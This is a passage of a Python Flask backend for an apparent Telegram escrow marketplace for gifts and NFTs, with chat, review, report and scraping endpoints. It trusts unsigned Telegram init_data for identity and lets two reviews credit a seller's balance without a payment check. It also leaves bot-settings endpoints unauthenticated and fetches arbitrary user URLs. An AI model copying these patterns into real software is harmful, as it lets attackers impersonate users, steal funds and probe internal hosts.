                    init_data_raw = request.form.get('init_data') if request.form else None
                    text = (request.form.get('text') or '').strip() if request.form else ''
                except Exception as e:
                    logger.error(f"Error getting data from form (fallback): {e}")
                    init_data_raw = None
                    text = ''

        # Обрабатываем init_data - может быть строкой или списком из parse_qs
        if not init_data_raw:
            return jsonify({'success': False, 'error': 'init_data required'}), 401
        
        # Если это список (из parse_qs), берем первый элемент
        if isinstance(init_data_raw, list):
            init_data = init_data_raw[0] if init_data_raw else ''
        else:
            init_data = str(init_data_raw)
        
        # Убираем лишние пробелы
        init_data = init_data.strip()
        
        if not init_data:
            return jsonify({'success': False, 'error': 'init_data is empty'}), 401

        # Парсим user_info с детальной обработкой ошибок
        import traceback
        try:
            user_info = get_user_from_init_data(init_data)
            logger.info(f"get_user_from_init_data returned: {type(user_info)}, value: {user_info}")
            
            if not user_info:
                logger.error(f"get_user_from_init_data returned None for init_data length: {len(init_data)}")
                return jsonify({'success': False, 'error': 'Invalid init_data format'}), 401
            
            if not isinstance(user_info, dict):
                logger.error(f"user_info is not a dict: {type(user_info)}")
                return jsonify({'success': False, 'error': 'Invalid user data format'}), 401
            
            if 'id' not in user_info:
                logger.error(f"user_info missing 'id' key. Keys: {list(user_info.keys()) if isinstance(user_info, dict) else 'N/A'}")
                return jsonify({'success': False, 'error': 'Invalid user data from init_data'}), 401
                
        except Exception as e:
            logger.error(f"Exception in get_user_from_init_data: {type(e).__name__}: {e}")
            logger.error(f"Traceback: {traceback.format_exc()}")
            return jsonify({'success': False, 'error': f'Error parsing init_data: {str(e)}'}), 401

        # Получаем или создаем пользователя
        try:
            telegram_id = user_info['id']
            logger.info(f"Getting/creating user for telegram_id: {telegram_id}")
            
            user = db.get_or_create_user(
                telegram_id=telegram_id,
                username=user_info.get('username', ''),
                first_name=user_info.get('first_name', ''),
                last_name=user_info.get('last_name', '')
            )
            
            logger.info(f"get_or_create_user returned: {type(user)}, value: {user}")
            
            if not user:
                logger.error(f"get_or_create_user returned None for telegram_id: {telegram_id}")
                return jsonify({'success': False, 'error': 'Failed to get or create user'}), 500
            
            if not isinstance(user, dict):
                logger.error(f"user is not a dict: {type(user)}")
                return jsonify({'success': False, 'error': 'Invalid user data from database'}), 500
            
            if 'id' not in user:
                logger.error(f"user missing 'id' key. Keys: {list(user.keys()) if isinstance(user, dict) else 'N/A'}")
                return jsonify({'success': False, 'error': 'User data is invalid'}), 500
                
        except KeyError as e:
            logger.error(f"KeyError in get_or_create_user: {e}, user_info keys: {list(user_info.keys()) if isinstance(user_info, dict) else 'N/A'}")
            logger.error(f"Traceback: {traceback.format_exc()}")
            return jsonify({'success': False, 'error': f'Missing required field: {str(e)}'}), 500
        except Exception as e:
            logger.error(f"Exception in get_or_create_user: {type(e).__name__}: {e}")
            logger.error(f"Traceback: {traceback.format_exc()}")
            return jsonify({'success': False, 'error': f'Error creating user: {str(e)}'}), 500

        # Чат из сделки - используем сообщения сделки
        # Новая логика: chat_id = deal_id * 10000 + user_id * 10 + (1 для продавца, 2 для покупателя)
        deal_id = chat_id // 10000
        deal = db.get_deal_by_id(deal_id)
        if not deal:
            return jsonify({'success': False, 'error': 'Chat not found'}), 404

        # Проверяем, не закрыта ли сделка (завершенные и отмененные сделки - чат закрыт)
        if deal.get('status') in ['completed', 'cancelled']:
            return jsonify({'success': False, 'error': 'Чат закрыт. Сделка завершена или отменена.'}), 403

        if not text and not photo:
            return jsonify({'success': False, 'error': 'Message text or photo is required'}), 400

        # Сохраняем фото если есть
        photo_url = None
        if photo:
            try:
                import os
                import shutil
                from werkzeug.utils import secure_filename
                # Сохраняем в /var/www/uploads (доступно для nginx)
                upload_folder = '/var/www/uploads'
                if not os.path.exists(upload_folder):
                    os.makedirs(upload_folder, mode=0o755)
                    # Устанавливаем права для www-data
                    try:
                        import pwd
                        www_data_uid = pwd.getpwnam('www-data').pw_uid
                        os.chown(upload_folder, www_data_uid, -1)
                    except:
                        pass
                filename = secure_filename(f"{deal_id}_{user['id']}_{datetime.now().timestamp()}.jpg")
                filepath = os.path.join(upload_folder, filename)
                photo.save(filepath)
                # Устанавливаем права на файл
                os.chmod(filepath, 0o644)
                try:
                    import pwd
                    www_data_uid = pwd.getpwnam('www-data').pw_uid
                    os.chown(filepath, www_data_uid, -1)
                except:
                    pass
                # Формируем полный URL для фото
                # Используем MINI_APP_URL из конфига (это базовый URL сервера)
                base_url = Config.MINI_APP_URL.rstrip('/')
                photo_url = f"{base_url}/uploads/{filename}"
                logger.info(f"Photo saved: {photo_url}")
            except Exception as e:
                logger.error(f"Error saving photo: {type(e).__name__}: {e}")
                logger.error(f"Traceback: {traceback.format_exc()}")
                return jsonify({'success': False, 'error': f'Error saving photo: {str(e)}'}), 500

        # Создаем сообщение
        try:
            sender_username = user_info.get('username') or f"user_{user_info['id']}"
            logger.info(f"Creating message: deal_id={deal_id}, sender_id={user['id']}, text_length={len(text) if text else 0}, photo_url={bool(photo_url)}")
            
            message_id = db.create_deal_message(
                deal_id=deal_id,
                sender_id=user['id'],
                sender_username=sender_username,
                text=text or '',
                photo_url=photo_url
            )
            
            logger.info(f"Message created with id: {message_id}")
            
            # Логируем сообщение в форум-чат
            try:
                from forum_logger import log_chat_message, run_async as run_async_log
                sender_info = {
                    'telegram_id': user_info['id'],
                    'username': sender_username,
                    'id': user['id']
                }
                result = run_async_log(log_chat_message(deal_id, sender_info, text or '', photo_url))
                if not result:
                    logger.error(f"❌ Failed to log chat message for deal {deal_id}")
                else:
                    logger.info(f"✅ Successfully logged chat message for deal {deal_id}")
            except Exception as e:
                logger.error(f"❌ Exception while logging chat message for deal {deal_id}: {e}", exc_info=True)
            
            # Отправляем уведомления в бот другим участникам сделки
            try:
                if deal:  # Проверяем, что deal не None
                    _send_bot_notification_for_new_message(deal_id, user['id'], sender_username, text or '📷 Фото', deal)
            except Exception as e:
                logger.error(f"Failed to send bot notification: {e}", exc_info=True)
            
            message = db.get_deal_message_by_id(message_id)
            if not message:
                logger.error(f"Failed to retrieve message with id: {message_id}")
                return jsonify({'success': False, 'error': 'Failed to retrieve created message'}), 500
            
            # Проверяем, что message - это словарь
            if not isinstance(message, dict):
                logger.error(f"Message is not a dict: {type(message)}, value: {message}")
                return jsonify({'success': False, 'error': 'Invalid message format'}), 500
            
            # Преобразуем формат для фронтенда
            formatted_message = {
                'id': message.get('id'),
                'dealId': message.get('deal_id'),
                'senderId': message.get('sender_id'),
                'senderUsername': message.get('sender_username'),
                'text': message.get('text', ''),
                'photoUrl': message.get('photo_url'),
                'isSystem': bool(message.get('is_system', 0)),
                'createdAt': message.get('created_at')
            }
            
            # Проверяем, что все обязательные поля присутствуют
            if formatted_message['id'] is None or formatted_message['dealId'] is None:
                logger.error(f"Message missing required fields: {formatted_message}")
                return jsonify({'success': False, 'error': 'Message data incomplete'}), 500
            logger.info(f"Message formatted successfully")
            return jsonify({'success': True, 'message': formatted_message})
            
        except Exception as e:
            logger.error(f"Error creating message: {type(e).__name__}: {e}")
            logger.error(f"Traceback: {traceback.format_exc()}")
            return jsonify({'success': False, 'error': f'Error creating message: {str(e)}'}), 500
    except Exception as e:
        import traceback
        logger.error(f"Error sending chat message: {type(e).__name__}: {e}")
        logger.error(f"Traceback: {traceback.format_exc()}")
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/user/settings', methods=['GET'])
def get_user_settings():
    """Получить настройки пользователя"""
    try:
        init_data = request.args.get('init_data') or request.args.get('initData')
        if not init_data:
            return jsonify({'success': False, 'error': 'init_data required'}), 401

        user_info = get_user_from_init_data(init_data)
        if not user_info:
            return jsonify({'success': False, 'error': 'Invalid init_data'}), 401

        user = db.get_user_by_telegram_id(user_info['id'])
        if not user:
            return jsonify({'success': False, 'error': 'User not found'}), 404

        settings = db.get_user_settings(user['id'])
        return jsonify({'success': True, 'data': settings})
    except Exception as e:
        logger.error(f"Error getting user settings: {e}", exc_info=True)
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/user/settings', methods=['POST'])
def update_user_settings():
    """Обновить настройки пользователя"""
    try:
        data = request.get_json() or {}
        init_data = data.get('init_data') or data.get('initData')
        if not init_data:
            return jsonify({'success': False, 'error': 'init_data required'}), 401

        user_info = get_user_from_init_data(init_data)
        if not user_info:
            return jsonify({'success': False, 'error': 'Invalid init_data'}), 401

        user = db.get_user_by_telegram_id(user_info['id'])
        if not user:
            return jsonify({'success': False, 'error': 'User not found'}), 404

        bot_notifications_enabled = data.get('bot_notifications_enabled')
        app_sounds_enabled = data.get('app_sounds_enabled')
        
        db.update_user_settings(
            user['id'],
            bot_notifications_enabled=bot_notifications_enabled,
            app_sounds_enabled=app_sounds_enabled
        )
        
        settings = db.get_user_settings(user['id'])
        return jsonify({'success': True, 'data': settings})
    except Exception as e:
        logger.error(f"Error updating user settings: {e}", exc_info=True)
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/deals/<int:deal_id>/report', methods=['POST'])
def create_report(deal_id: int):
    """Подать жалобу на участника сделки"""
    try:
        data = request.get_json() or {}
        init_data = data.get('init_data') or data.get('initData')
        
        if not init_data:
            return jsonify({'success': False, 'error': 'Authorization required'}), 401
        
        user_info = get_user_from_init_data(init_data)
        if not user_info:
            return jsonify({'success': False, 'error': 'Invalid authorization'}), 401
        
        user = db.get_user_by_telegram_id(user_info['id'])
        if not user:
            return jsonify({'success': False, 'error': 'User not found'}), 404
        
        deal = db.get_deal_by_id(deal_id)
        if not deal:
            return jsonify({'success': False, 'error': 'Deal not found'}), 404
        
        # Проверяем, что пользователь является участником сделки
        if user['id'] not in [deal.get('seller_id'), deal.get('buyer_id')]:
            return jsonify({'success': False, 'error': 'You are not a participant of this deal'}), 403
        
        reported_user_id = data.get('reported_user_id')
        reason = data.get('reason')
        description = data.get('description', '')
        
        if not reported_user_id or not reason:
            return jsonify({'success': False, 'error': 'Missing required fields'}), 400
        
        # Проверяем, что жалоба не на самого себя
        if reported_user_id == user['id']:
            return jsonify({'success': False, 'error': 'Cannot report yourself'}), 400
        
        # Проверяем, что жалоба на участника сделки
        if reported_user_id not in [deal.get('seller_id'), deal.get('buyer_id')]:
            return jsonify({'success': False, 'error': 'Reported user is not a participant of this deal'}), 400
        
        # Создаем жалобу
        report_id = db.create_report(
            deal_id=deal_id,
            reporter_id=user['id'],
            reported_user_id=reported_user_id,
            reason=reason,
            description=description
        )
        
        # Системное сообщение в чат о жалобе
        try:
            reported_user = db.get_user_by_id(reported_user_id)
            reported_username = reported_user.get('username') or f"user_{reported_user_id}" if reported_user else f"user_{reported_user_id}"
            
            db.create_deal_message(
                deal_id=deal_id,
                sender_id=0,
                sender_username='Urionsbot',
                text=f"Подана жалоба на пользователя @{reported_username}. Причина: {reason}",
                photo_url=None,
                is_system=True
            )
        except Exception as e:
            logger.error(f"Failed to add report system message: {e}")
        
        return jsonify({'success': True, 'report_id': report_id, 'message': 'Жалоба успешно подана'})
    except Exception as e:
        logger.error(f"Error creating report: {e}")
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/deals/<int:deal_id>/review', methods=['POST'])
def submit_review(deal_id):
    """Оставить отзыв по сделке"""
    try:
        data = request.get_json() or {}
        init_data = data.get('init_data') or data.get('initData')
        
        if not init_data:
            return jsonify({
                'success': False,
                'error': 'Authorization required',
                'requires_auth': True
            }), 401
        
        user_info = get_user_from_init_data(init_data)
        if not user_info:
            return jsonify({
                'success': False,
                'error': 'Invalid authorization',
                'requires_auth': True
            }), 401
        
        deal = db.get_deal_by_id(deal_id)
        if not deal:
            return jsonify({'success': False, 'error': 'Deal not found'}), 404
        
        user = db.get_user_by_telegram_id(user_info['id'])
        if not user:
            return jsonify({'success': False, 'error': 'User not found'}), 404
        
        # Проверяем, что пользователь является участником сделки
        if user['id'] not in [deal.get('seller_id'), deal.get('buyer_id')]:
            return jsonify({'success': False, 'error': 'You are not a participant of this deal'}), 403
        
        # Определяем, кому оставляем отзыв (другому участнику)
        # to_user_id может быть передан в кнопке или определяется автоматически
        to_user_id = data.get('to_user_id')
        if not to_user_id:
            if user['id'] == deal.get('seller_id'):
                to_user_id = deal.get('buyer_id')
            else:
                to_user_id = deal.get('seller_id')
        
        if not to_user_id:
            return jsonify({'success': False, 'error': 'Other participant not found'}), 400
        
        # Проверяем, не оставил ли уже отзыв этому пользователю по этой сделке
        if db.has_user_reviewed_deal(user['id'], to_user_id, deal_id):
            return jsonify({'success': False, 'error': 'Вы уже оставили отзыв этому пользователю по этой сделке'}), 400
        
        # Получаем тип отзыва из review_type (positive/negative) или is_positive
        review_type = data.get('review_type')
        if review_type:
            is_positive = (review_type == 'positive')
        else:
            is_positive = data.get('is_positive', True)
        review_text = data.get('review_text', f"Отзыв по сделке #{deal_id}")
        
        # Получаем информацию о пользователе, которому оставляем отзыв
        to_user = db.get_user_by_id(to_user_id)
        to_username = to_user.get('username') if to_user else f"user_{to_user_id}"
        
        # Создаем отзыв (порядок параметров: from_user_id, to_user_id, deal_id, is_positive, review_text)
        review_id = db.create_review(user['id'], to_user_id, deal_id, is_positive, review_text)
        
        # Создаем системное сообщение о том, что отзыв оставлен (видно только оставившему отзыв)
        review_type_text = "положительный" if is_positive else "отрицательный"
        try:
            message_text = f"Вы оставили {review_type_text} отзыв @{to_username}"
            logger.info(f"Creating review confirmation message: deal_id={deal_id}, user_id={user['id']}, text={message_text}")
            message_id = db.create_deal_message(
                deal_id=deal_id,
                sender_id=0,
                sender_username='Urionsbot',
                text=message_text,
                photo_url=None,
                is_system=True,
                target_user_id=user['id']  # Видно только тому, кто оставил отзыв
            )
            logger.info(f"Successfully created review confirmation message with ID: {message_id}")
        except Exception as e:
            logger.error(f"Failed to add review confirmation message: {e}", exc_info=True)
        
        # Проверяем, оставили ли оба участника отзывы друг другу
        seller_reviewed_buyer = db.has_user_reviewed_deal(deal.get('seller_id'), deal.get('buyer_id'), deal_id) if deal.get('seller_id') and deal.get('buyer_id') else False
        buyer_reviewed_seller = db.has_user_reviewed_deal(deal.get('buyer_id'), deal.get('seller_id'), deal_id) if deal.get('seller_id') and deal.get('buyer_id') else False
        
        deal_completed = False
        if seller_reviewed_buyer and buyer_reviewed_seller:
            # Оба участника оставили отзывы - сделка завершена
            old_status = deal.get('status')
            
            # Обновляем статус сделки на completed ПЕРВЫМ, чтобы счетчик completed_deals обновился
            if old_status != 'completed':
                db.update_deal_status(deal_id, 'completed')
                logger.info(f"✅ Deal #{deal_id} status updated to 'completed' via reviews (was: {old_status})")
                
                # Логируем завершение сделки в форум-чат
                try:
                    from forum_logger import log_deal_completed, run_async as run_async_log
                    updated_deal = db.get_deal_by_id(deal_id)
                    if updated_deal:
                        deal_completed_data = {
                            'title': updated_deal.get('title', 'N/A'),
                            'price': updated_deal.get('price', 0),
                            'currency': updated_deal.get('currency', 'RUB'),
                            'seller_username': updated_deal.get('seller_username', ''),
                            'buyer_username': updated_deal.get('buyer_username', '')
                        }
                        # Завершено через отзывы, без указания пользователя
                        result = run_async_log(log_deal_completed(deal_id, deal_completed_data, None))
                        if not result:
                            logger.error(f"❌ Failed to log deal completion via reviews for deal {deal_id}")
                        else:
                            logger.info(f"✅ Successfully logged deal completion via reviews for deal {deal_id}")
                except Exception as e:
                    logger.error(f"❌ Exception while logging deal completion via reviews for deal {deal_id}: {e}", exc_info=True)
                deal_completed = True
                
                # Проверяем, был ли уже пополнен баланс (если сделка была в статусе 'paid', значит менеджер уже подтвердил)
                # Если нет - пополняем баланс здесь
                if old_status != 'paid' and deal.get('seller_id'):
                    try:
                        currency = deal.get('currency', 'RUB')
                        price = deal.get('price', 0)
                        seller_id = deal['seller_id']
                        logger.info(f"💰 Adding balance after reviews: seller_id={seller_id}, amount={price}, currency={currency}")
                        db.add_balance(seller_id, price, currency)
                        logger.info(f"✅ Balance added after reviews completion")
                    except Exception as e:
                        logger.error(f"❌ Failed to add balance after reviews: {e}", exc_info=True)
            else:
                logger.info(f"Deal #{deal_id} is already completed, skipping status update")
            
            # Системное сообщение о завершении сделки (видно всем)
            try:
                db.create_deal_message(
                    deal_id=deal_id,
                    sender_id=0,
                    sender_username='Urionsbot',
                    text="Сделка завершена. Средства зачислены.",
                    photo_url=None,
                    is_system=True,
                    target_user_id=None  # Видно всем
                )
            except Exception as e:
                logger.error(f"Failed to add completion system message: {e}")
        
        return jsonify({
            'success': True,
            'review_id': review_id,
            'deal_completed': deal_completed,
            'message': 'Отзыв успешно оставлен'
        })
    except Exception as e:
        logger.error(f"Error submitting review: {e}")
        return jsonify({'success': False, 'error': str(e)}), 500
    except Exception as e:
        logger.error(f"Error creating report: {e}")
        return jsonify({'success': False, 'error': str(e)}), 500

def get_user_from_init_data(init_data: str) -> dict:
    """Извлечь данные пользователя из init_data"""
    import urllib.parse
    import json
    import re
    
    try:
        if not init_data:
            return None
        
        # Преобразуем в строку, если это не строка
        if not isinstance(init_data, str):
            init_data = str(init_data)
        
        # Убираем лишние пробелы и переносы строк
        init_data = init_data.strip()
        
        if not init_data:
            return None
        
        # Декодируем URL-кодирование (может быть уже декодировано)
        try:
            raw = urllib.parse.unquote(init_data)
        except Exception:
            # Если не удалось декодировать, используем как есть
            raw = init_data
        
        # Парсим query string
        # Используем strict_parsing=False чтобы не падать на некорректных данных
        try:
            qs = urllib.parse.parse_qs(raw, keep_blank_values=True, strict_parsing=False)
        except Exception as e:
            logger.warning(f"Error parsing query string: {e}, raw length: {len(raw)}")
            return None
        
        user_str = (qs.get('user') or [None])[0]
        
        if not user_str:
            return None
        
        # Парсим JSON из user
        # Убираем возможные лишние пробелы и экранирование
        user_str = user_str.strip()
        # Если это уже JSON объект, пробуем распарсить напрямую
        if user_str.startswith('{') and user_str.endswith('}'):
            try:
                user_json = json.loads(user_str)
            except json.JSONDecodeError:
                # Пробуем еще раз после дополнительной обработки
                user_str = user_str.replace('\\"', '"').replace("\\'", "'")
                user_json = json.loads(user_str)
        else:
            # Если это не JSON, пробуем декодировать еще раз
            try:
                user_str = urllib.parse.unquote(user_str)
                user_json = json.loads(user_str)
            except Exception:
                return None
        
        # Проверяем наличие обязательного поля id
        if 'id' not in user_json:
            return None
        
        return {
            'id': int(user_json.get('id')),
            'username': user_json.get('username', ''),
            'first_name': user_json.get('first_name', ''),
            'last_name': user_json.get('last_name', '')
        }
    except json.JSONDecodeError as e:
        logger.warning(f"JSON decode error in init_data: {e}, init_data preview: {init_data[:100] if init_data else 'None'}")
        return None
    except (ValueError, KeyError, TypeError) as e:
        logger.warning(f"Error parsing init_data: {type(e).__name__}: {e}")
        return None
    except Exception as e:
        logger.warning(f"Unexpected error parsing init_data: {type(e).__name__}: {e}")
        import traceback
        logger.warning(f"Traceback: {traceback.format_exc()}")
        return None

# Роуты для HTML страниц авторизации должны быть ДО общего роута фронтенда
# (уже определены выше, но убеждаемся что они работают)

# Маршрут для раздачи статических файлов фронтенда (должен быть последним)
# ВАЖНО: HTML страницы авторизации (/auth, /auth/code, /auth/password, /auth/success)
# обрабатываются Flask роутами выше, поэтому они не попадут сюда
@app.route('/', defaults={'path': ''})
@app.route('/<path:path>')
def serve_frontend(path):
    """Раздача статических файлов фронтенда"""
    # HTML страницы авторизации обрабатываются Flask роутами выше
    if path in ['auth-html', 'auth-html/code', 'auth-html/password', 'auth-html/success']:
        # Эти роуты НЕ должны попадать сюда, но на всякий случай возвращаем 404
        # чтобы не отдавать React приложение
        abort(404)
    
    if path and path.startswith('api/'):
        # API маршруты обрабатываются выше
        abort(404)
    
    if path != "" and os.path.exists(os.path.join(DIST_FOLDER, path)):
        return send_from_directory(DIST_FOLDER, path)
    
    return send_from_directory(DIST_FOLDER, 'index.html')

@app.route('/api/deals/<int:deal_id>/gifts', methods=['GET'])
def get_deal_gifts(deal_id):
    """Получить все подарки по сделке"""
    try:
        init_data = request.args.get('init_data') or request.args.get('initData')
        if not init_data:
            return jsonify({'success': False, 'error': 'init_data required'}), 401

        user_info = get_user_from_init_data(init_data)
        if not user_info:
            return jsonify({'success': False, 'error': 'Invalid init_data'}), 401

        # Проверяем, что пользователь является участником сделки
        deal = db.get_deal_by_id(deal_id)
        if not deal:
            return jsonify({'success': False, 'error': 'Deal not found'}), 404

        user = db.get_user_by_telegram_id(user_info['id'])
        if not user:
            return jsonify({'success': False, 'error': 'User not found'}), 404

        # Проверяем доступ
        if user['id'] not in [deal.get('seller_id'), deal.get('buyer_id')]:
            return jsonify({'success': False, 'error': 'Access denied'}), 403

        # Получаем подарки
        gifts = db.get_gifts_by_deal(deal_id)
        return jsonify({'success': True, 'gifts': gifts})
    except Exception as e:
        logger.error(f"Error getting deal gifts: {e}")
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/messages/<int:message_id>', methods=['DELETE'])
def delete_message(message_id):
    """Удалить сообщение"""
    try:
        init_data = request.args.get('init_data') or request.args.get('initData')
        if not init_data:
            return jsonify({'success': False, 'error': 'init_data required'}), 401

        user_info = get_user_from_init_data(init_data)
        if not user_info:
            return jsonify({'success': False, 'error': 'Invalid init_data'}), 401

        user = db.get_user_by_telegram_id(user_info['id'])
        if not user:
            return jsonify({'success': False, 'error': 'User not found'}), 404

        # Удаляем сообщение
        success = db.delete_message(message_id, user['id'])
        if not success:
            return jsonify({'success': False, 'error': 'Message not found or you do not have permission to delete it'}), 403

        return jsonify({'success': True, 'message': 'Message deleted'})
    except Exception as e:
        logger.error(f"Error deleting message: {e}")
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/template-settings')
def template_settings_page():
    """Страница настройки шаблона бота"""
    return render_template('template_settings.html')

@app.route('/api/template-settings/<int:bot_id>', methods=['GET'])
def get_template_settings(bot_id):
    """Получить настройки шаблона бота"""
    try:
        import sqlite3
        killamonjaro_db_path = '/root/KillamonjaroAuto/data/bot.db'
        
        if not os.path.exists(killamonjaro_db_path):
            return jsonify({'success': False, 'error': 'Database not found'}), 404
        
        with sqlite3.connect(killamonjaro_db_path, timeout=10.0) as conn:
            conn.row_factory = sqlite3.Row
            cursor = conn.cursor()
            cursor.execute(
                'SELECT * FROM user_bots WHERE id = ? AND is_active = 1',
                (bot_id,)
            )
            row = cursor.fetchone()
            
            if not row:
                return jsonify({'success': False, 'error': 'Bot not found'}), 404
            
            settings = {
                'welcome_message': row['welcome_message'] or '',
                'inline_gifts': row['inline_gifts'] or '',
                'gift_received_message': row['gift_received_message'] or '',
                'gift_error_message': row['gift_error_message'] or '',
                'gift_not_found_message': row['gift_not_found_message'] or '',
                'gift_already_received_message': row['gift_already_received_message'] or '',
                'gift_access_denied_message': row['gift_access_denied_message'] or '',
                'check_success_message': row['check_success_message'] or '',
                'check_not_found_message': row['check_not_found_message'] or '',
                'check_already_used_message': row['check_already_used_message'] or '',
                'check_activation_error_message': row['check_activation_error_message'] or '',
                'market_button_text': row['market_button_text'] or '',
                'collections_button_text': row['collections_button_text'] or '',
            }
            
            return jsonify({'success': True, 'settings': settings})
    except Exception as e:
        logger.error(f"Error getting template settings: {e}")
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/template-settings/<int:bot_id>', methods=['POST'])
def save_template_settings(bot_id):
    """Сохранить настройки шаблона бота"""
    try:
        import sqlite3
        killamonjaro_db_path = '/root/KillamonjaroAuto/data/bot.db'
        
        if not os.path.exists(killamonjaro_db_path):
            return jsonify({'success': False, 'error': 'Database not found'}), 404
        
        data = request.get_json()
        if not data:
            return jsonify({'success': False, 'error': 'No data provided'}), 400
        
        with sqlite3.connect(killamonjaro_db_path, timeout=10.0) as conn:
            cursor = conn.cursor()
            
            # Проверяем, что бот существует
            cursor.execute('SELECT id FROM user_bots WHERE id = ? AND is_active = 1', (bot_id,))
            if not cursor.fetchone():
                return jsonify({'success': False, 'error': 'Bot not found'}), 404
            
            # Обновляем настройки
            updates = []
            params = []
            
            fields = [
                'welcome_message', 'inline_gifts', 'gift_received_message',
                'gift_error_message', 'gift_not_found_message',
                'gift_already_received_message', 'gift_access_denied_message',
                'check_success_message', 'check_not_found_message',
                'check_already_used_message', 'check_activation_error_message',
                'market_button_text', 'collections_button_text'
            ]
            
            for field in fields:
                if field in data:
                    updates.append(f'{field} = ?')
                    params.append(data[field] or None)
            
            if updates:
                params.append(bot_id)
                query = f"UPDATE user_bots SET {', '.join(updates)} WHERE id = ?"
                cursor.execute(query, params)
                conn.commit()
            
            return jsonify({'success': True, 'message': 'Settings saved'})
    except Exception as e:
        logger.error(f"Error saving template settings: {e}")
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/nft/attributes', methods=['GET'])
def get_nft_attributes():
    """Получить атрибуты NFT (модель, символ, фон) из ссылки Fragment"""
    try:
        import urllib.request
        import urllib.parse
        
        gift_name = request.args.get('name')
        gift_id = request.args.get('id')
        gift_link = request.args.get('link')
        
        if not gift_name or not gift_id:
            return jsonify({'success': False, 'error': 'name and id required'}), 400
        
        # Если ссылка не передана, формируем её
        if not gift_link:
            gift_link = f"https://t.me/nft/{gift_name}-{gift_id}"
        
        attributes = {
            'model': None,
            'symbol': None,
            'backdrop': None,
            'modelPercent': None,
            'symbolPercent': None,
            'backdropPercent': None
        }
        
        try:
            # Делаем запрос к странице NFT
            req = urllib.request.Request(
                gift_link,
                headers={
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
                }
            )
            
            with urllib.request.urlopen(req, timeout=10) as response:
                page_text = response.read().decode('utf-8', errors='ignore')
                
                # Вариант 1: Извлекаем данные из og:description мета-тега (основной способ)
                og_desc_pattern = r'<meta\s+property=["\']og:description["\']\s+content=["\']([^"\']+?)["\']'
                og_desc_match = re.search(og_desc_pattern, page_text, re.IGNORECASE | re.DOTALL)
                
                if og_desc_match:
                    og_content = og_desc_match.group(1)
                    # Парсим строки формата "Model: Value\nBackdrop: Value\nSymbol: Value"
                    lines = og_content.split('\n')
                    for line in lines:
                        line = line.strip()
                        if not line:
                            continue
                        
                        # Model
                        if re.match(r'^Model\s*:\s*(.+)$', line, re.IGNORECASE):
                            model_match = re.match(r'^Model\s*:\s*(.+)$', line, re.IGNORECASE)
                            if model_match and not attributes['model']:
                                attributes['model'] = model_match.group(1).strip()
                        
                        # Symbol
                        elif re.match(r'^Symbol\s*:\s*(.+)$', line, re.IGNORECASE):
                            symbol_match = re.match(r'^Symbol\s*:\s*(.+)$', line, re.IGNORECASE)
                            if symbol_match and not attributes['symbol']:
                                attributes['symbol'] = symbol_match.group(1).strip()
                        
                        # Backdrop
                        elif re.match(r'^Backdrop\s*:\s*(.+)$', line, re.IGNORECASE):
                            backdrop_match = re.match(r'^Backdrop\s*:\s*(.+)$', line, re.IGNORECASE)
                            if backdrop_match and not attributes['backdrop']:
                                attributes['backdrop'] = backdrop_match.group(1).strip()
                
                # Вариант 2: Ищем в twitter:description (резервный способ)
                if not attributes['model'] or not attributes['symbol'] or not attributes['backdrop']:
                    twitter_desc_pattern = r'<meta\s+name=["\']twitter:description["\']\s+content=["\']([^"\']+?)["\']'
                    twitter_desc_match = re.search(twitter_desc_pattern, page_text, re.IGNORECASE | re.DOTALL)
                    
                    if twitter_desc_match:
                        twitter_content = twitter_desc_match.group(1)
                        lines = twitter_content.split('\n')
                        for line in lines:
                            line = line.strip()
                            if not line:
                                continue
                            
                            if re.match(r'^Model\s*:\s*(.+)$', line, re.IGNORECASE):
                                model_match = re.match(r'^Model\s*:\s*(.+)$', line, re.IGNORECASE)
                                if model_match and not attributes['model']:
                                    attributes['model'] = model_match.group(1).strip()
                            
                            elif re.match(r'^Symbol\s*:\s*(.+)$', line, re.IGNORECASE):
                                symbol_match = re.match(r'^Symbol\s*:\s*(.+)$', line, re.IGNORECASE)
                                if symbol_match and not attributes['symbol']:
                                    attributes['symbol'] = symbol_match.group(1).strip()
                            
                            elif re.match(r'^Backdrop\s*:\s*(.+)$', line, re.IGNORECASE):
                                backdrop_match = re.match(r'^Backdrop\s*:\s*(.+)$', line, re.IGNORECASE)
                                if backdrop_match and not attributes['backdrop']:
                                    attributes['backdrop'] = backdrop_match.group(1).strip()
                
                # Вариант 3: Ищем в script тегах с JSON данными (дополнительный способ)
                if not attributes['model'] or not attributes['symbol'] or not attributes['backdrop']:
                    script_pattern = r'<script[^>]*type=["\']application/json["\'][^>]*>(.*?)</script>'
                    scripts = re.findall(script_pattern, page_text, re.DOTALL | re.IGNORECASE)
                    
                    for script_content in scripts:
                        try:
                            script_content = script_content.strip()
                            if not script_content:
                                continue
                                
                            data = json.loads(script_content)
                            
                            # Рекурсивно ищем нужные ключи
                            def find_keys(obj, keys_to_find, depth=0):
                                if depth > 10:
                                    return
                                if isinstance(obj, dict):
                                    for key, value in obj.items():
                                        key_lower = str(key).lower()
                                        if any(k in key_lower for k in keys_to_find):
                                            if 'model' in key_lower and not attributes['model'] and isinstance(value, (str, int, float)):
                                                attributes['model'] = str(value)
                                            elif 'symbol' in key_lower and not attributes['symbol'] and isinstance(value, (str, int, float)):
                                                attributes['symbol'] = str(value)
                                            elif 'backdrop' in key_lower and not attributes['backdrop'] and isinstance(value, (str, int, float)):
                                                attributes['backdrop'] = str(value)
                                        find_keys(value, keys_to_find, depth + 1)
                                elif isinstance(obj, list):
                                    for item in obj:
                                        find_keys(item, keys_to_find, depth + 1)
                            
                            find_keys(data, ['model', 'symbol', 'backdrop', 'pattern'])
                        except (json.JSONDecodeError, ValueError):
                            continue
                
        except Exception as e:
            logger.warning(f"Error parsing NFT attributes from {gift_link}: {e}")
        
        return jsonify({
            'success': True,
            'data': attributes
        })
        
    except Exception as e:
        logger.error(f"Error getting NFT attributes: {e}", exc_info=True)
        return jsonify({'success': False, 'error': str(e)}), 500

def _pascal_to_tonnel_name(name):
